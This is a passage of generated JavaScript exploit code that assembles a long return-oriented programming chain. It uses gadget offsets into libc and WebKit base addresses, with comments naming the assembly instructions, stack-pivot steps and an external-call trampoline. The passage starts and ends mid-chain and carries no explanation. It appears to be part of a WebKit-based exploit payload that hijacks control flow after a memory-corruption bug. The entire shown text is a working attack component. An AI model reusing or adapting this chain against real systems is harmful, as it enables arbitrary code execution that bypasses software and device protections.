webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2203:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2204:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+152136, //L2208
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+152104, //L2206
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+152120, //L2207
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2206:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2207:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2208:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+152208, //L2210
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2210:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+152264, //L2211
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2211:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+152344, //L2213
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2213:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2214:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+152448, //L2216
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+152464, //L2217
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2216:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2217:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+152616, //L2219
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+152648, //L2222
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+152632, //L2220
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+152600, //L2221
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2221:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2219:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2220:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2222:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+152768, //L2224
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+152784, //L2225
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+152752, //L2223
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2223:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2224:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2225:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+152872, //L2227
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2227:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+152928, //L2228
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2228:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+153000, //L2230
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2230:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2231:
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2233:
db([40, 0]); // 0x28
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+153144, //L2235
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153160, //L2236
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2235:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2236:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+153304, //L2240
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+153272, //L2238
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153288, //L2239
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2238:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2239:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2240:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+153384, //L2241
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2241:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2242:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+153488, //L2244
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153504, //L2245
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2244:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2245:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+153648, //L2249
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+153616, //L2247
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153632, //L2248
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2247:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2248:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2249:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+153720, //L2251
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2251:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+153776, //L2252
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2252:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+153856, //L2254
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2254:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2255:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+153960, //L2257
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153976, //L2258
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2257:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2258:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+154128, //L2260
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+154160, //L2263
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+154144, //L2261
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+154112, //L2262
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2262:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2260:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2261:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2263:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+154280, //L2265
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+154296, //L2266
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+154264, //L2264
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2264:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2265:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2266:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+154384, //L2268
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2268:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+154440, //L2269
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2269:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+154536, //L2272
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2272:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+154592, //L2273
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2273:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2275:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2276:
db([16, 0]); // 0x10
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+154744, //L2278
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2278:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+154800, //L2279
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2279:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+154904, //L2281
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2281:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2282:
db([32, 0]); // 0x20
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+155008, //L2284
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155024, //L2285
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2284:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2285:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+155168, //L2289
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+155136, //L2287
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155152, //L2288
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2287:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2288:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2289:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+155248, //L2290
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2290:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2291:
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+155352, //L2293
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155368, //L2294
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2293:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2294:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+155512, //L2298
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+155480, //L2296
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155496, //L2297
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2296:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2297:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2298:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2300:
ropchain+155616, //L2299
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+86472, //_create_extcall
//L2299:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+155688, //L2301
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2301:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2302:
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+155792, //L2304
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155808, //L2305
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2304:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2305:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+155952, //L2309
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+155920, //L2307
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155936, //L2308
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2307:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2308:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2309:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2310:
jop_frame_addr,
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+156080, //L2311
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2311:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2312:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+156184, //L2314
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156200, //L2315
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2314:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2315:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+156344, //L2319
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+156312, //L2317
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156328, //L2318
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2317:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2318:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2319:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+156424, //L2320
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2320:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2321:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+156528, //L2323
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156544, //L2324
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2323:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2324:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+156688, //L2328
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+156656, //L2326
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156672, //L2327
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2326:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2327:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2328:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2330:
ropchain+156792, //L2329
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+158952, //L2331
//L2329:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+156928, //L2332
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+156944, //L2334
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156912, //L2333
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2333:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2332:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2334:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+157064, //L2336
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157080, //L2337
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+157048, //L2335
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2335:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2336:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2337:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157176, //L2338
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157192, //L2339
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2338:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2339:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157304, //L2340
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157288, //L2341
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2341:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+157392, //L2343
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+157376, //L2342
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2342:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2343:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157488, //L2344
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157504, //L2345
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2344:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2345:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157616, //L2346
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157600, //L2347
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2347:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2346:
db([0, 0]); // 0x0
//L2121:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
